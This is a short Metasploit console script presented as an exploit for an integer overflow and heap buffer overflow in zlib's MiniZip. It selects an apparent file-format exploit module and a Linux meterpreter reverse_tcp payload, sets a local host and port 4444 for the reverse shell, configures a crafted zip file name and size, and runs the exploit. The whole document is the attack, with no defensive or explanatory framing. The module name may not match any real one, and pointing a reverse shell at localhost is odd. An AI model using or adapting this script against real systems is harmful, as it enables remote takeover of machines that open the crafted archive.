
# zlib exploit script for integer overflow and heap-based buffer overflow in MiniZip

# Define the target
use exploit/linux/file_format/minizip_heap_overflow

# Set the payload
set PAYLOAD linux/x86/meterpreter/reverse_tcp

# Configure the local host and port for the reverse shell
set LHOST localhost
set LPORT 4444

# Set the file name and options for the exploit
set FILENAME long_filename.zip
set FILESIZE 1048576 # Adjust this size if needed

# Set the target options for the exploit
set TARGET 0

# Show options to confirm settings
show options

# Run the exploit
exploit